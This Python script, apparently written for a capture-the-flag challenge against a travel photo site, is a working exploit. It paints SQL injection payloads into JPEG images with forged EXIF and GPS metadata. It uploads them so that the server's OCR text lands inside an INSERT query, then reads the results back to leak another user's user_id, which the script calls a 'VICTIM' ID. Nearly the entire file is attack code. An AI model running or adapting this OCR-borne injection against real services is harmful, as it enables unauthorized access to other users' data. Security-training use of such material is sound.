# open_quote_fix.py — the OCR reads leading quotes as '*'. The CLOSING quote works because it's
# glued to ||. So make the OPENING quote also glued to || / letters so it's read as ' not *.
# Try payloads where the opening quote is embedded, e.g.  x'||...  or  '||...  with a leading
# letter, or use the pattern that mirrors the working closing side.
from PIL import Image, ImageDraw, ImageFont
import piexif, base64, requests, re

BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"
base_img = Image.open("paisaje.png").convert("RGB")
q = chr(39)
UURE = re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}")

def build(text, path, size=32):
    W = min(1600, max(1000, 40+int(len(text)*size*0.60))); H=280
    img = base_img.resize((W,H)); d=ImageDraw.Draw(img)
    font=None
    for p in ["C:/Windows/Fonts/consolab.ttf","C:/Windows/Fonts/cour.ttf"]:
        try: font=ImageFont.truetype(p,size); break
        except: pass
    if font is None: font=ImageFont.load_default()
    bbox=d.textbbox((20,20),text,font=font)
    d.rectangle([0,0,W,bbox[3]+20],fill=(255,255,255))
    d.text((20,20),text,font=font,fill=(0,0,0))
    img.save(path,"jpeg",quality=72,optimize=True)
    def dms(x):
        dd=int(x);m=int((x-dd)*60);s=round((x-dd-m/60)*3600,4);return((dd,1),(m,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),path)
    return "data:image/jpeg;base64,"+base64.b64encode(open(path,"rb").read()).decode()

def try_payload(name, painted):
    uri = build(painted, "oq.jpg")
    r = requests.post(f"{BASE}/upload", json={"image":uri,"description":name,"user_id":UID})
    sc = r.status_code
    ocr = ""
    if sc == 200:
        data = requests.get(f"{BASE}/images/{UID}").json()
        row = next((x for x in data if x.get("description")==name), None)
        ocr = row.get("summary_ocr","") if row else ""
    leak = [u for u in UURE.findall(str(ocr)) if u != UID]
    print(f"{name:14} {sc}  ocr={ocr!r}" + (f"  >>> VICTIM {leak}" if leak else ""))
    return leak[0] if leak else None

SUB = "(SELECT user_id FROM images WHERE id=1)"
# opening quote glued to letters/pipes so OCR reads ' not *
tries = {
    "lead_x":   "x"+q+"||"+SUB+"||"+q,          # x' opens
    "lead_pipe":"|"+q+"||"+SUB+"||"+q,          # |' opens (mirror of closing ||')
    "lead_a_dd":"a"+q+q+"||"+SUB+"||"+q+q,      # a'' with doubling
    "concat_lead": q+"||"+SUB+"||"+q+" ",       # trailing space, single quotes
    "closeonly":  "z"+q+"||"+SUB,               # ONE quote, let INSERT's ) close it (comment style)
    "closeonly2": "z"+q+"||"+SUB+" ",
}
found=None
for name, p in tries.items():
    hit = try_payload("OQ_"+name, p)
    if hit: found=hit; break

if found:
    print("\n==== VICTIM user_id:", found, "====")
    print("Next: GET /images/%s" % found)
